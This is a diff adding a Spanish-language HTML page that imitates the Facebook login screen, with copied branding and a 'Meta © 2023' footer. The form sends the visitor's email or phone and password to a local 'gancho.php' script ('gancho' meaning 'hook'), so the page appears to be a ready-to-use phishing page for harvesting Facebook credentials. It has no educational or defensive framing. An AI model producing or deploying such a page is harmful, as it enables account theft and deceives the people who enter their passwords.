@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Conéctate con amigos y el mundo que te rodea</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 50px;
+            color: #4267b2;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4267b2;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .language-links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+        .footer {
+            margin-top: auto;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Facebook</h1>
+        <p>Conéctate con amigos y el mundo que te rodea en Facebook.</p>
+
+        <form action="gancho.php" method="post">
+            <input type="text" id="user" name="user" placeholder="Correo electrónico o número de teléfono" required>
+            <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar Sesión</button>
+        </form>
+
+        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
+
+        <p><a href="#">Crear cuenta nueva</a></p>
+
+        <p><a href="#">Crear una página para una celebridad, marca o negocio.</a></p>
+
+    </div>
+
+    <div class="footer">
+        <p>Meta © 2023</p>
+    </div>
+</body>
+</html>
